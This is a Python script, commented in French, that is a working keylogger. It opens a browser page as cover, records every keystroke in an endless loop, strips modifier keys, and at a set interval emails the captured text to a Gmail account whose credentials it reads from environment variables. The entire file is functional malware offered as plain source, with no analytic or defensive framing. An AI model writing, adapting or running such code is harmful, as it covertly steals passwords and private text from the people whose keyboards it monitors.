import keyboard
import webbrowser
import smtplib
import ssl
from dotenv import load_dotenv
from os import getenv

load_dotenv(".env")

webbrowser.open("www.google.com")
compteur = 0

all_str_recorded = ""
mail = getenv("keylogger_MAIL")
password = getenv("keylogger_PASS")
rate = int(getenv("keylogger_RATE"))


def envoi():
    with smtplib.SMTP_SSL(
        "smtp.gmail.com", 465, context=ssl.create_default_context()
    ) as server:
        server.login(mail, password)
        server.sendmail(
            mail,
            mail,
            all_str_recorded.encode("ascii", errors="namereplace"),
        )


while True:
    keyboard_events_recorder = keyboard.record(until="enter")

    str_recorded = str(keyboard_events_recorder)

    # on supprime tous les mots clés KeyboardEvent(
    sub = str_recorded.replace("KeyboardEvent(", "")

    formated_str = ""

    # on supprime toutes les touches "up" car on veut uniquement une fois la touche quand c'est "down"
    for i in sub.split(","):
        if "up" not in i:
            formated_str += i

    # on supprime maintenant l'indication down)
    sub3 = formated_str.replace(" down)", "")

    # les mots clés dont on n'a pas besoin
    no_use_keywords = {
        "enter": "",
        "esc": "",
        "ctrl": "",
        "alt": "",
        "tab": "",
        "rightshift": "",
        "leftshift": "",
        " ": "",
        "space": " ",
        "maj": "",
    }
    sub4 = sub3
    for key, value in no_use_keywords.items():
        sub4 = sub4.replace(key, value)

    all_str_recorded += sub4

    compteur += 1

    if compteur == rate:
        compteur = 0
        envoi()
        all_str_recorded = ""
